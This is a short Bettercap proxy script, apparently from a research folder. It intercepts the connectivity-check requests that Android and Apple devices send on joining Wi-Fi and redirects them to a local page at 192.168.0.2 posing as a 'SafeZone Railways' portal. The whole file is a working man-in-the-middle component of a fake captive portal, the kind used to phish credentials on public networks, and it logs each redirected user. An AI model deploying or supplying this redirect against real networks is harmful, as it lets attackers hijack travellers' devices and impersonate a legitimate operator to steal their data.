// Bettercap Proxy Script
// research/portal/redirect.js
function onRequest(req, res) {
  if (
    req.Hostname == "connectivitycheck.gstatic.com" ||
    req.Hostname == "captive.apple.com"
  ) {
    res.Status = 302;
    res.SetHeader("Location", "http://192.168.0.2/index.html");
    res.Body = "Redirecting to SafeZone Railways portal...";
    console.log("[+] Redirecting user to SafeZone Portal at 192.168.0.2");
  }
}
